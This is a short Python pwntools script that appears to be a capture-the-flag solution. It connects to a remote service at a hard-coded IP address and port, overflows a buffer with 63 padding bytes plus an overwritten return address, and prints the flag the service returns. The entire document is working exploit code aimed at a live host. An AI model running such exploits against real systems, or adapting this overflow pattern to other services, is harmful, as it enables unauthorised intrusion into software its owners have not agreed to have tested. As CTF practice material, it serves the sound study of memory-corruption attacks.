#!/usr/bin/env python
# coding=utf-8
from pwn import *
context(arch = 'i386', os = 'linux')
r = remote('111.198.29.45', 32048)
overflow = "A"*63
addr = 0x080486cc
overflow += p32(addr)
r.send(overflow + "\n")
r.recvuntil("Enter the string to be validate")
flag = r.recv()
print "[*] Flag: " + flag
r.close()